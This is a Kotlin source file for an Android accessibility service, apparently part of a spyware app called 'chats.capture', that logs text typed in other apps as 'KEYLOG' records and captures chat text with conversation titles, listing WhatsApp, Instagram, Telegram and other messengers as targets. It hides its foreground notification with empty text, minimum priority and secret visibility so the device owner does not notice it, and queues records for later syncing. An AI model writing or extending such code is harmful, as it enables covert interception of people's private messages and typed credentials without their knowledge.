package com.chats.capture.services

import android.accessibilityservice.AccessibilityService
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.Intent
import android.os.Build
import android.view.accessibility.AccessibilityEvent
import androidx.core.app.NotificationCompat
import com.chats.capture.CaptureApplication
import com.chats.capture.CaptureApplication.Companion.KEYBOARD_CHANNEL_ID
import com.chats.capture.R
import com.chats.capture.database.ChatDao
import com.chats.capture.models.ChatData
import com.chats.capture.ui.MainActivity
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import timber.log.Timber

class KeyboardCaptureService : AccessibilityService() {
    
    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.Main)
    private lateinit var chatDao: ChatDao
    private lateinit var deviceRegistrationManager: com.chats.capture.managers.DeviceRegistrationManager
    
    private val targetAppPackages = setOf(
        "com.whatsapp",
        "com.instagram.android",
        "com.facebook.katana",
        "com.facebook.orca",
        "org.telegram.messenger",
        "com.snapchat.android",
        "com.twitter.android",
        "com.discord",
        "com.viber.voip",
        "com.skype.raider"
    )
    
    private var lastTextBuffer = ""
    private var lastPackageName = ""
    private var lastChatIdentifier: String? = null
    
    override fun onServiceConnected() {
        super.onServiceConnected()
        Timber.d("KeyboardCaptureService connected")
        
        val database = (application as CaptureApplication).database
        chatDao = database.chatDao()
        deviceRegistrationManager = com.chats.capture.managers.DeviceRegistrationManager(this)
        
        startForegroundService()
    }
    
    override fun onDestroy() {
        super.onDestroy()
        Timber.d("KeyboardCaptureService destroyed")
    }
    
    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        // Capture keyboard input from non-target apps only
        // Target apps are handled by EnhancedAccessibilityService with better data (proper chatIdentifier)
        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val packageName = event.packageName?.toString() ?: ""
                
                // Skip target apps - EnhancedAccessibilityService handles them
                if (!isTargetApp(packageName)) {
                    // Capture keylogs from non-target apps only
                handleKeylog(event)
                    // Also handle chat capture for non-target apps
                    handleTextChanged(event)
                }
            }
            AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED -> {
                // Handle text selection if needed
            }
        }
    }
    
    private fun handleKeylog(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: return
        val text = event.text?.firstOrNull()?.toString() ?: ""
        
        // Skip if same as last captured (debounce)
        if (text == lastTextBuffer && packageName == lastPackageName) {
            return
        }
        
        // Only capture meaningful text (length > 1)
        if (text.isNotBlank() && text.length > 1) {
            serviceScope.launch {
                try {
                    val appName = getAppName(packageName)
                    val deviceId = deviceRegistrationManager.getDeviceId()
                    
                    // Store keylog as chat data (can be filtered later)
                    val keylogData = ChatData(
                        deviceId = deviceId,
                        appPackage = packageName,
                        appName = appName,
                        chatIdentifier = "KEYLOG",
                        text = text,
                        timestamp = System.currentTimeMillis(),
                        synced = false
                    )
                    
                    chatDao.insertChat(keylogData)
                    Timber.v("Keylog captured: $packageName - ${text.take(20)}...")
                    
                    // Update last captured values
                    lastTextBuffer = text
                    lastPackageName = packageName
                } catch (e: Exception) {
                    Timber.e(e, "Error capturing keylog")
                }
            }
        }
    }
    
    override fun onInterrupt() {
        Timber.w("KeyboardCaptureService interrupted")
    }
    
    private fun handleTextChanged(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: return
        val text = event.text?.firstOrNull()?.toString() ?: ""
        
        // Debounce: Only capture if text actually changed
        if (text == lastTextBuffer && packageName == lastPackageName) {
            return
        }
        
        // Extract chat identifier if possible
        val chatIdentifier = extractChatIdentifier(event)
        
        // Only capture if we have meaningful text
        if (text.isNotBlank() && text.length > 1) {
            serviceScope.launch {
                try {
                    val appName = getAppName(packageName)
                    
                    val chatData = ChatData(
                        appPackage = packageName,
                        appName = appName,
                        chatIdentifier = chatIdentifier,
                        text = text,
                        timestamp = System.currentTimeMillis(),
                        synced = false
                    )
                    
                    chatDao.insertChat(chatData)
                    com.chats.capture.utils.AppStateManager.incrementChatCount(this@KeyboardCaptureService)
                    Timber.d("Chat captured: ${chatData.id} - $text")
                    
                    // Update last captured values
                    lastTextBuffer = text
                    lastPackageName = packageName
                    lastChatIdentifier = chatIdentifier
                    
                } catch (e: Exception) {
                    Timber.e(e, "Error capturing chat")
                }
            }
        }
    }
    
    private fun extractChatIdentifier(event: AccessibilityEvent): String? {
        // Try to extract chat identifier from accessibility node
        return try {
            val source = event.source ?: return null
            val windowTitle = source.window?.title?.toString()
            windowTitle?.takeIf { it.isNotBlank() }
        } catch (e: Exception) {
            Timber.e(e, "Error extracting chat identifier")
            null
        }
    }
    
    private fun isTargetApp(packageName: String): Boolean {
        return targetAppPackages.any { packageName.startsWith(it) }
    }
    
    private fun getAppName(packageName: String): String {
        return try {
            val pm = packageManager
            val appInfo = pm.getApplicationInfo(packageName, 0)
            pm.getApplicationLabel(appInfo).toString()
        } catch (e: Exception) {
            packageName
        }
    }
    
    private fun startForegroundService() {
        val notificationIntent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this,
            0,
            notificationIntent,
            PendingIntent.FLAG_IMMUTABLE
        )
        
        // Create completely silent and invisible notification (required for foreground service)
        val notification = NotificationCompat.Builder(this, KEYBOARD_CHANNEL_ID)
            .setContentTitle("") // Empty title
            .setContentText("") // Empty text
            .setSmallIcon(android.R.drawable.ic_menu_info_details) // System icon (less visible)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN) // Minimum priority - won't show
            .setVisibility(NotificationCompat.VISIBILITY_SECRET) // Hidden everywhere
            .setShowWhen(false) // Don't show timestamp
            .setSilent(true) // Completely silent
            .setCategory(NotificationCompat.CATEGORY_SERVICE) // System service category
            .build()
        
        if (android.os.Build.VERSION.SDK_INT >= 34) {
            startForeground(KEYBOARD_SERVICE_ID, notification, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        } else {
            startForeground(KEYBOARD_SERVICE_ID, notification)
        }
    }
    
    companion object {
        private const val KEYBOARD_SERVICE_ID = 1002
    }
}
